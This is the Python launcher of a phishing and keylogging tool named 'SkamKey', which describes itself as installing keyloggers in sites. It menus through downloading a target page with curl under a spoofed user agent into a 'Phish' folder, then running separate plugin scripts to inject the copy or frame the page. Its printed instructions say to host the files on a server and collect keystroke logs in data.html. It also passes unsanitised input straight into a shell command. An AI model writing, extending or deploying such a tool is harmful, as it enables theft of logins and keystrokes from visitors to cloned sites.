import os , sys , fileinput , subprocess
###You can change the User Agent here###
UserA="""Mozilla/5.0 (Linux; U; Android 2.2; en-gb; Nexus One Build/FRF50) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"""
S10 = '\033[91m'#yellow
S11 = '\033[94m'#clearblue
S12 = '\033[93m'#pink
def draw():
    print(""" (                         )           """)
    print(""" )\ )   )               ( /(           """)
    print("""(()/(( /(    )    )     )\()) (  (     """)
    print(""" /(_))\())( /(   (    |((_)\ ))\ )\ )  """)
    print("""(_))((_)\ )(_))  )\  '|_ ((_)((_|()/(  """)
    print("""/ __| |(_|(_)_ _((_)) | |/ (_))  )(_)) """)
    print("""\__ \ / // _` | '  \()  ' </ -_)| || | """)
    print("""|___/_\_\\__,_|_|_|_|  _|\_\___| \_, | """)
    print("""                                 |__/  """+S11)

def clear(numlines=100):
  print(S10)
  if os.name == "posix":
    print('\n' * numlines)
    os.system('clear')
    draw()
  elif os.name in ("nt", "dos", "ce"):
    print('\n' * numlines)
    os.system('CLS')
    draw()
  else:
    print('\n' * numlines)
    draw()
clear()

os.system('mkdir Phish')
clear()
def menu1():
    clear()
    target =input(S12+'Target Page > '+S10)
    clear()
    output=input(S12+'Output > '+S10)
    UserA="""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"""
    cmd = ("curl --user-agent '"+UserA+"' "+target+" > "+output)
    os.system(cmd)
    clear()
def main1():
    clear()
    print("""\n\n\n\n\nChoose option\n#1-Inject a Downloaded page\n#2-Frame method(No download needed)\n""")
    mn1 = input(S12+'OutPhish > '+S10)
    if mn1 == '1':
        cmd1 = "python plugin.py"
        exec(open('plugin.py').read())
        exit()
    if mn1 == '2':
        clear()
        exec(open('pluginframe.py').read())
        exit()
    else:
        clear()
        input('Error....\n')
        main1()
def main():
    clear()
    print('Welcome to SkamKey,\nMade by Out-Shit https://out-shit.github.io/SkamKey\n\nThis is a program who install KeyLogger in sites\nAll files in "Phish" folder have to be host on a server (even the .htaccess). All the Keylogs will be in the data.html')
    input()
    clear()
    print("""\n\n\n\n\nChoose option\n#1-Download page\n#2-Inject the page\n""")
    mn = input(S12+'OutPhish > '+S10)
    if mn == '1':
        clear()
        menu1()
        exit()
    if mn == '2':
        clear()
        main1()
        exit()
    else:
        clear()
        input('Error....\n')
        main()
        exit()
main()
exit()
